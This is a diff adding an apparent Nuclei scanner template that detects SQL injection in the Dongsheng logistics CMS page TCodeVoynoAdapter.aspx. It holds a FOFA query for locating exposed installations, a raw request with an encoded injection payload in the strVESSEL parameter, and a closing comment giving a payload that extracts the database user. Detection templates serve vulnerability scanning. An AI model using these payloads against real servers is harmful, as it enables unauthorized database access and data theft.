@@ -1,0 +1,24 @@
+id: dongsheng-wuliucms-tcodevoynoadapter-sqli
+info:
+  name: dongsheng-wuliucms-tcodevoynoadapter-sqli
+  author: unknow
+  severity: critical
+  description: 东胜物流cms tcodevoynoadapter.aspx 存在sql注入。
+  tags: dongsheng,sqli
+  metadata:
+    fofa-query: body="CompanysAdapter.aspx" || (body="dhtmlxcombo_whp.js" && body="dhtmlxcommon.js")
+
+http:
+  - raw:
+      - |
+        GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27+and+substring%28sys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271%27%29%29%2C3%2C32%29%3E0%3B-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1==500 && contains(body_1, "c4ca4238a0b923820dcc509a6f75849b") && contains(header_1, "text/html")'
+
+#查用户：/FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27+and+user+%3E0%3B--
